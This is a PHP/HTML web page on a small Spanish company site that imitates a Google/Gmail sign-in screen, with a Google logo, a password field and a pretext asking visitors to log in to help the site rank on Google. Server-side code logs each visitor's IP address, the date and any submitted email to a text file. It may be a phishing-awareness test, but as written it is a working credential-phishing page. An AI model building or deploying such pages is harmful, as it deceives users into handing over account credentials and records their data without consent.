<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="../style.css"/>
    <link rel="stylesheet" type="text/css" href="style.css"/>
    <title>Sign In</title>
</head>
<body>
<?php
$ip_add=$_SERVER['REMOTE_ADDR'];

if (isset ($_POST["correo"])){$correo = $_POST["correo"];}
if (isset ($_POST["contraseña"])){$contraseña = $_POST["contraseña"];}

$fecha=getdate();
$archivo = fopen ("../../formularios/encuestas.txt", "a");
fputs($archivo,  $fecha['mday'].'/'.$fecha['mon'].'/'.$fecha['year']."\n"."IP PÚBLICA: ".$ip_add."\n"."Correo: ".substr($correo, 0, 40)."\n");
fclose ($archivo);
?>
    <nav>
        <img src="../logo.png" alt="logo empresa" name="logo"/>
        <ul>
            <li><a href="../index.html">INICIO</a></li>
            <li><a href="../recursos/index.html">RECURSOS</a></li>
            <li><a href="../contacto/index.html">CONTACTO</a></li>
            <li><a href="../reparacion/index.html">REPARACIONES</a></li>
        </ul>
    </nav>
    <p style="text-align: center; margin-top: 5%">Inicie sesión para ayudar a amcred.es a posicionarse en google.es</p>
    <form method="post" action="encuesta.php">
        <img src="logo-Google.png" width="25%"/>
        <h1>Iniciar sesión</h1>
        <h2>Ir a Gmail</h2>
        <!--<input type="email" name="correo" placeholder="Correo electrónico o teléfono"/>-->
        <input type="password" name="contraseña" placeholder="Escriba su contraseña" required maxlength="40"/>
        <a href="">¿Has olvidado tu correo electrónico?</a>
        <input id="enviar" type="image" src="enviar.png" width="9%" style="border: 0;"/>
    </form>
</body>
</html>